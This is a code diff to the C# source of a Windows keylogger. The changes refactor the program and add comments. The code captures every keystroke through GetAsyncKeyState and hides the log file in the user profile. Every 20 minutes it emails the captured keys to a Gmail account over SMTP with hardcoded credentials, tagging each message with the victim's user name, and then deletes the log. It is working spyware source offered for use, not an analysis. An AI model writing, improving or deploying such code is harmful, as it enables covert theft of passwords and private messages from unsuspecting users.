@@ -11,9 +11,11 @@ namespace KeyLogger
 {
     class Program
     {
-        private string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Log.txt";
+        private static string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Log.txt"; // Path to log file
+        private static StreamWriter file = new StreamWriter(path, true); // Used to write to log file
+        private bool elapsed = false; // Used to halt key writing to log
 
-        private Dictionary<int, string> KeysDictionary = new Dictionary<int, string>()
+        private Dictionary<int, string> KeysDictionary = new Dictionary<int, string>() // Used to map the keys
         {
             { 1, "[PRIMARY MOUSE BUTTON]" },
             { 2, "[SECONDARY MOUSE BUTTON]" },
@@ -130,7 +132,7 @@ namespace KeyLogger
         };
 
         [DllImport("user32.dll")]
-        public static extern int GetAsyncKeyState(Int32 i);
+        public static extern int GetAsyncKeyState(Int32 i); // Imported and used to get key code 
         static void Main(string[] args)
         {
             new Program().start();
@@ -139,23 +141,22 @@ namespace KeyLogger
         private void start()
         {
             if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Hidden);
-            Timer t = new Timer();
-            t.Interval = 60000 * 20;
-            t.Elapsed += sendEmail;
-            t.AutoReset = true;
+            Timer t = new Timer(60000 * 20); // Used to send an email
+            t.Elapsed += sendEmail;          // with the log contents 
+            t.AutoReset = true;              // every 20 minutes
             t.Enabled = true;
+
+            int key = 0; // Used to store the user pressed key
 
             while (true)
             {
                 for (int i = 0; i < 255; i++)
                 {
-                    int key = GetAsyncKeyState(i);
-                    if (key != 0)
+                    if ((key = GetAsyncKeyState(i)) != 0) // Checks if user pressed a key
                     {
-                        StreamWriter file = new StreamWriter(path, true);
-                        File.SetAttributes(path, FileAttributes.Hidden);
-                        file.Write(verifyKey(i));
-                        file.Close();
+                        while (elapsed) { } // Halts the loop while the email is sent
+                        File.SetAttributes(path, FileAttributes.Hidden); // Writes the newly pressed
+                        file.Write(verifyKey(i));                        // key to a hidden file
                         break;
                     }
                 }
@@ -164,31 +165,38 @@ namespace KeyLogger
 
         private string verifyKey(int code)
         {
-            return KeysDictionary.ContainsKey(code) ? KeysDictionary[code] : "[" + code + "]";
+            return KeysDictionary.ContainsKey(code) ? KeysDictionary[code] : "[" + code + "]"; // Returns the key according to the passed code
         }
 
         private void sendEmail(object source, ElapsedEventArgs e)
         {
             try
             {
+                elapsed = true; // Blocks key logging
+                file.Close();   // Closes the writing stream
+
                 MailMessage mail = new MailMessage();
                 SmtpClient server = new SmtpClient("smtp.gmail.com");
 
-                mail.From = new MailAddress("email");
-                mail.To.Add("dest");
+                mail.From = new MailAddress("email");                       // Creates new email header
+                mail.To.Add("email");
                 mail.Subject = "Log: " + WindowsIdentity.GetCurrent().Name;
 
-                if (!File.Exists(path)) return;
+                if (!File.Exists(path)) return;          // Writes log content to email subject
                 StreamReader r = new StreamReader(path);
                 string content = r.ReadLine();
                 r.Close();
                 File.Delete(path);
                 mail.Body = content;
 
-                server.Port = 587;
+                server.Port = 587;                                               // Sends email to defined subject using network credentials
                 server.Credentials = new NetworkCredential("email", "password");
                 server.EnableSsl = true;
                 server.Send(mail);
+
+
+                file = new StreamWriter(path, true); // Creates a new writing stream
+                elapsed = false;                     // Clears key logging block
             }
             catch (Exception ex)
             {
